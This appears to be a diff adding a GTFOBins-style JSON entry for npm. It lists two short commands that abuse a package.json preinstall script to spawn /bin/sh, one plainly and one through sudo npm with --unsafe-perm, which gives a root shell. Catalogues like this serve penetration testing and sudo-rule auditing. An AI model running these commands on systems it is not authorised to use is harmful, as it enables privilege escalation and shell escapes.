@@ -1,0 +1,14 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nnpm -C $TF i\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "TF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json\nsudo npm -C $TF --unsafe-perm i\n"
+      }
+    ]
+  }
+}
